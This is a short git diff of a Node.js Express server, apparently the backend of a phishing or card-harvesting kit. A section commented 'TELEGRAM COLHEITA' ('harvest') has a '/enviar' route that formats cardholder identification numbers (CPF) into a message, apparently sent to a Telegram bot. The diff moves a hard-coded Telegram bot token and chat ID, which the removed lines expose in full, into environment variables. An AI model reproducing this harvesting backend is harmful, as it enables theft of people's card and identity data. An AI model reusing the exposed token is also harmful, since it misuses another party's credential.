@@ -88,8 +88,8 @@ app.post('/login', (req, res) => {
 
 //TELEGRAM COLHEITA
 
-const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
-const CHAT_ID = "-1002852733056"; 
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID; 
 
 app.post("/enviar", async (req, res) => {
     try {
@@ -126,6 +126,7 @@ Cpf: ${cardholderIdentificationNumber}
         res.status(500).send("Erro no servidor");
     }
 });
+
 
 
 
